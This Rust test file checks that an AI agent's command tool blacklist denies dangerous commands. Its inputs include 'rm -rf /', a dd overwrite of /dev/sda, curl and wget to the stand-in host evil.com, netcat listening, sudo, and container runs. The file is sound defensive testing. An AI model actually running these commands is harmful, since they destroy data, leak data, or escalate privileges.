//! Command blacklist enforcement tests.
//!
//! Tests that the command blacklist correctly denies dangerous commands.
//! Note: Some tests for "allowed" commands may fail with ExecutionError
//! in MemoryWorkspace because it doesn't have a real filesystem.

use crate::agents::session::{AgentSession, SessionDrain};
use crate::mcp_server::tool_registry::{ToolError, ToolRegistry};
use crate::workspace::memory_workspace::MemoryWorkspace;
use std::sync::Arc;

fn dev_session() -> AgentSession {
    AgentSession::for_drain("test-run".to_string(), SessionDrain::Development, 1)
}

fn test_workspace() -> Arc<dyn crate::workspace::Workspace> {
    Arc::new(MemoryWorkspace::new_test())
}

fn tool_registry() -> ToolRegistry {
    ToolRegistry::with_ralph_tools()
}

// Version control commands - all blacklisted

#[test]
fn test_blacklist_git() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "git", "args": ["status"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    // Should be denied by blacklist, not capability
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

#[test]
fn test_blacklist_svn() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "svn", "args": ["update"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

#[test]
fn test_blacklist_hg() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "hg", "args": ["status"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

// Privilege escalation - all blacklisted

#[test]
fn test_blacklist_sudo() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "sudo", "args": ["ls"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

#[test]
fn test_blacklist_su() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "su", "args": ["root"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

// Destructive commands - all blacklisted

#[test]
fn test_blacklist_rm_rf() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "rm", "args": ["-rf", "/"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

#[test]
fn test_blacklist_dd_with_device() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "dd", "args": ["if=/dev/zero", "of=/dev/sda"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

// Network/exfiltration risks - blacklisted

#[test]
fn test_blacklist_curl_external() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "curl", "args": ["https://evil.com"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

#[test]
fn test_blacklist_wget_external() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "wget", "args": ["https://evil.com"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

#[test]
fn test_blacklist_ssh() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "ssh", "args": ["user@host"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

#[test]
fn test_blacklist_nc() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "nc", "args": ["-l", "1234"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

// Package managers - blacklisted

#[test]
fn test_blacklist_apt_install() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "apt", "args": ["install", "package"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

#[test]
fn test_blacklist_yum_install() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "yum", "args": ["install", "package"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

#[test]
fn test_blacklist_brew_install() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "brew", "args": ["install", "package"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

// Container/VM escape - blacklisted

#[test]
fn test_blacklist_docker_run() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "docker", "args": ["run", "ubuntu"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

#[test]
fn test_blacklist_podman() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "podman", "args": ["run", "ubuntu"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

// Multi-file operations - blacklisted

#[test]
fn test_blacklist_find_exec() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "find", "args": [".", "-exec", "rm", "{}", ";"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

#[test]
fn test_blacklist_sed_i() {
    let registry = tool_registry();
    let session = dev_session();
    let workspace = test_workspace();

    let result = registry.execute(
        &session,
        workspace.as_ref(),
        "ralph_exec_command",
        serde_json::json!({"command": "sed", "args": ["-i", "s/old/new/g", "*.txt"]}),
    );

    assert!(result.is_err());
    let err = result.unwrap_err();
    assert!(matches!(err, ToolError::CapabilityDenied(_)));
}

// Note: Tests for "allowed" commands (echo, pwd, ls, cat) are not included
// because MemoryWorkspace doesn't have a real filesystem, so the commands
// may fail with ExecutionError rather than succeeding. The important thing
// is that they are NOT denied by the blacklist policy.
